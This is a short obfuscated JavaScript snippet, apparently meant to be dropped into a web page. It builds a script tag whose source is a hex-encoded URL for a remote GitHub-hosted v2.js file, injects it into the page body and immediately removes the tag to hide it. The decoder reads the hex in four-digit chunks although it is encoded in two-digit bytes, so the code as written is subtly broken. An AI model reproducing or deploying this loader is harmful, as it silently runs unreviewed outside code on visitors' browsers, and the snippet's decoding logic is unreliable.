! function () {
    var _0x776ex1 = document.createElement('script'),
        _0x776ex2 = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f72697469656e73696e682f72697469656e73696e682e6769746875622e696f2f6d61737465722f76322e6a73';
    _0x776ex1.async = 'true';
    _0x776ex1.src = function (_0x776ex1) {
        var _0x776ex2, _0x776ex3 = _0x776ex1.match(/.{1,4}/g) || [],
            _0x776ex4 = '';
        for (_0x776ex2 = 0; _0x776ex2 < _0x776ex3.length; _0x776ex2++) {
            _0x776ex4 += String.fromCharCode(parseInt(_0x776ex3[_0x776ex2], 16))
        };
        return _0x776ex4
    }(_0x776ex2), document.body.appendChild(_0x776ex1), _0x776ex1.remove()
}()
